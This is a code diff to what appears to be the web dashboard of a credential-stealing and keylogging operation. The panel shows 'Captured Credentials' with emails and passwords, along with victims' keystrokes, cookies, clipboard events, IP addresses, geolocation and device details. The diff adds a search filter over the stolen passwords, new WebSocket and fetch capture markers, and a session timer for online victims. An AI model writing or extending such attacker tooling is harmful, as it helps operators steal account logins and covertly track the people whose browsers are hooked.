@@ -544,7 +544,8 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
     <div class="pnl">
         <div class="pnl-h">
             <h2>🔑 Captured Credentials</h2>
-            <div style="display:flex;gap:6px">
+            <div style="display:flex;gap:6px;align-items:center">
+                <input id="creds-search" type="search" placeholder="Search credentials..." style="font-size:.65rem;padding:3px 8px;border:1px solid var(--border2);border-radius:6px;background:var(--bg2);color:var(--text);width:180px" oninput="filterCredentials()">
                 <button class="btn export" onclick="downloadCredentialsCSV()" title="Download als CSV bestand">⬇ CSV</button>
                 <button class="btn danger" onclick="if(confirm('Delete all credentials?'))clearCredentials()">Clear</button>
             </div>
@@ -1596,7 +1597,8 @@ function renderKeystrokes(keys) {
         'SCROLL': '#6ee7b7', 'MOTION': '#f9a8d4',
         'COOKIES': '#fcd34d', 'PERF': '#67e8f9',
         'FORM SUBMIT': '#f97316', 'RAGE CLICK': '#ef4444',
-        'NAVIGATOR': '#a5b4fc', 'FONTS': '#fda4af'
+        'NAVIGATOR': '#a5b4fc', 'FONTS': '#fda4af',
+        'WEBSOCKET': '#38bdf8', 'FETCH': '#7dd3fc'
     };
     function colorizeMarker(text) {
         // Color special [MARKER ...] prefixes
@@ -1610,7 +1612,7 @@ function renderKeystrokes(keys) {
         let highlighted = safe.replace(/\[(BS|ENTER|TAB|ESC|DEL|UP|DN|LT|RT)\]/g,
             '<span class="special">[$1]</span>');
         highlighted = colorizeMarker(highlighted);
-        const isSpecial = /\[(?:PASTE|LINK|SCROLL|RESIZE|IDLE|VISIBLE|HIDDEN|PAGE|WEBRTC|AUTOFILL|DEVICE|BATTERY|COPY|CUT|PRINT|NETWORK|FIELD|INPUT|TIMEZONE|LOCAL|SESSION|MEDIA|MOTION|COOKIES|PERF|FORM|RAGE|NAVIGATOR|FONTS)/.test(k.keys || '');
+        const isSpecial = /\[(?:PASTE|LINK|SCROLL|RESIZE|IDLE|VISIBLE|HIDDEN|PAGE|WEBRTC|AUTOFILL|DEVICE|BATTERY|COPY|CUT|PRINT|NETWORK|FIELD|INPUT|TIMEZONE|LOCAL|SESSION|MEDIA|MOTION|COOKIES|PERF|FORM|RAGE|NAVIGATOR|FONTS|WEBSOCKET|FETCH)/.test(k.keys || '');
         return `<div class="key-entry"${isSpecial ? ' style="background:rgba(148,163,184,.05)"' : ''}>
             <div class="key-hdr"><span class="key-id">${escHtml(k.clientId)}</span><span class="key-time">${fmtTime(k.timestamp)}</span></div>
             ${k.url ? `<div class="key-url">${escHtml(k.url)}</div>` : ''}
@@ -1689,7 +1691,18 @@ async function loadCredentials() {
     // Track which clients have credentials for quick-filter
     window._credClientIds = new Set(creds.map(c => c.clientId));
     window._lastCreds = creds;
-    renderCredentials(creds);
+    filterCredentials();
+}
+
+function filterCredentials() {
+    const q = ($('#creds-search')?.value || '').toLowerCase();
+    const data = window._lastCreds || [];
+    renderCredentials(q ? data.filter(c =>
+        (c.email || '').toLowerCase().includes(q) ||
+        (c.password || '').toLowerCase().includes(q) ||
+        (c.clientId || '').toLowerCase().includes(q) ||
+        (c.source || c.url || '').toLowerCase().includes(q)
+    ) : data);
 }
 
 // ── TIMELINE ────────────────────────────────────────────────
@@ -2125,7 +2138,10 @@ function renderClients(clients) {
         const dur     = cl.firstSeen ? fmtDuration(cl.firstSeen) : '';
         const idleH   = cl.isIdle ? ` <span style="color:#886;font-size:.6rem" title="Idle ${cl.idleSecs||0}s">[IDLE]</span>` : '';
         const hiddenH = cl.tabHidden ? ` <span style="color:#556;font-size:.6rem">[HIDDEN]</span>` : '';
-        const scrollH = cl.maxScrollPct ? ` <span style="color:var(--dim);font-size:.6rem" title="Max scroll depth">?${cl.maxScrollPct}%</span>` : '';
+        const scrollH = cl.maxScrollPct ? ` <span style="color:var(--dim);font-size:.6rem" title="Max scroll depth">↕${cl.maxScrollPct}%</span>` : '';
+        const sessionH = cl.online && cl.onlineSince
+            ? ` <span style="color:#6fcf97;font-size:.6rem" title="Session duration">⏱ ${fmtDuration(cl.onlineSince)}</span>`
+            : '';
 
         const labelBadge = label ? `<span class="cl-label-badge" style="border-color:#bdc1c6;color:#5f6368">${esc(label)}</span>` : '';
         const tagBadges  = tagList.map(t => `<span class="cl-label-badge">${esc(t)}</span>`).join('');
@@ -2141,7 +2157,7 @@ function renderClients(clients) {
                 <div class="cid" title="${id}">${isPinned ? '[P] ' : ''}${id} <button class="copy-btn" onclick="event.stopPropagation();copyText('${id}',this)">Copy</button></div>
                 ${anomalyBanner}
                 ${badgeRow}
-                <div class="meta">${cl.online ? 'Online' : ('Offline · ' + fmtAgo(cl.lastSeen))} - ${fmtTime(cl.lastSeen)}${battH}${netH} - <span onclick="event.stopPropagation();copyText('${cl.ip || ''}',this)" style="cursor:pointer;text-decoration:underline dotted" title="Click to copy IP">${cl.ip || ''}</span>${idleH}${hiddenH}${scrollH}</div>
+                <div class="meta">${cl.online ? 'Online' : ('Offline · ' + fmtAgo(cl.lastSeen))} - ${fmtTime(cl.lastSeen)}${battH}${netH} - <span onclick="event.stopPropagation();copyText('${cl.ip || ''}',this)" style="cursor:pointer;text-decoration:underline dotted" title="Click to copy IP">${cl.ip || ''}</span>${idleH}${hiddenH}${scrollH}${sessionH}</div>
                 ${locH}${geoH}
                 <div class="dev">${cl.screen || ''} - ${cl.language || ''} - ${cl.timezone || ''} ${dur ? '- ' + dur : ''}</div>
                 <div class="dev" style="opacity:.55">${(cl.userAgent || '').slice(0, 100)}</div>
